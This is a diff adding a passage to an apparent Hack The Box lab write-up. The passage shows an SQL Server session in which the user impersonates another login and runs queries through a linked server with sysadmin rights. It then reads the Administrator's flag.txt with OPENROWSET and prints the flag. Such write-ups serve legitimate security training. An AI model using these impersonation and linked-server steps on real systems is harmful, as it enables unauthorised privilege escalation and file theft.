@@ -833,6 +833,252 @@ This command allowed me to successfully connect to the remote desktop of the mac
 
 * **Submit the contents of the flag.txt file on the Administrator Desktop.**
 
+Now that I've identified the user I proceeded to impersonate him in order to gain admin privileges.
+
+```bash
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Fiona>sqlcmd
+1> SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES;
+2> GO
+table_name                                                                                                              
+--------------------------------------------------------------------------------------------------------------------------------
+spt_fallback_db                                                                                                         
+spt_fallback_dev                                                                                                        
+spt_fallback_usg                                                                                                        
+spt_values                                                                                                              
+spt_monitor                                                                                                             
+
+(5 rows affected)
+1>  EXECUTE AS LOGIN = 'john';
+2> SELECT SYSTEM_USER;
+3> SELECT IS_SRVROLEMEMBER('sysadmin');
+4> GO
+                                                                                                                        
+--------------------------------------------------------------------------------------------------------------------------------
+john                                                                                                                    
+
+(1 rows affected)
+
+-----------
+          0
+
+(1 rows affected)
+1> SELECT srvname, isremote FROM sysservers;
+2> GO
+srvname                                                                                                                          isremote
+-------------------------------------------------------------------------------------------------------------------------------- --------
+WINSRV02\SQLEXPRESS                                                                                                                     1
+LOCAL.TEST.LINKED.SRV                                                                                                                   0
+
+(2 rows affected)
+1>  EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];
+2> GO
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+-------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------------------------------------------------------------------------------------------------------- -----------
+WINSRV02\SQLEXPRESS                                                                                                              Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+        Sep 24 2019 13:48:23
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+                                                                                     testadmin                                                                                                                                  1
+
+(1 rows affected)
+1> execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
+2> GO
+BulkColumn                                                                                                                                                                                                                                      
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+HTB{46u$!n9_l!nk3d_$3rv3r$}                                                                                                                                                                                                                     
+
+(1 rows affected)
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
